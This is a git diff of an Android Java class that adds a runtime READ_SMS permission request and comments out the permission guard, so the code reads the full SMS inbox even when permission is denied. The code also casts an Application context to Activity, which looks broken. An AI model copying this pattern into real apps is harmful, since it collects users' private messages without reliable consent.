@@ -1,5 +1,7 @@
 package com.example.androiddatachecker;
 
+import android.Manifest;
+import android.app.Activity;
 import android.app.Application;
 import android.content.ContentResolver;
 import android.content.Context;
@@ -7,6 +9,7 @@ import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.widget.ArrayAdapter;
 import android.widget.ListView;
@@ -41,7 +44,12 @@ public class SaveUserMessage extends Application{
 
     protected static void SaveUserMessage() {
         SaveUserMessage ctx = new SaveUserMessage(context);
-        if (ContextCompat.checkSelfPermission(ctx, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
+        if (ActivityCompat.checkSelfPermission((Activity)context, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions((Activity) context, new String[]{
+                    android.Manifest.permission.READ_SMS
+            }, 10);
+        }
+       // if (ContextCompat.checkSelfPermission(ctx, "android.permission.READ_SMS") == PackageManager.PERMISSION_GRANTED) {
 
             ContentResolver contentResolver = ctx.getContentResolver();
             Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/"), null, null, null, null);
@@ -62,7 +70,7 @@ public class SaveUserMessage extends Application{
             } while (smsInboxCursor.moveToNext());
             smsInboxCursor.close();
             //InsertData("papa","pa@mail.com");
-        }
+        //}
     }
 
 
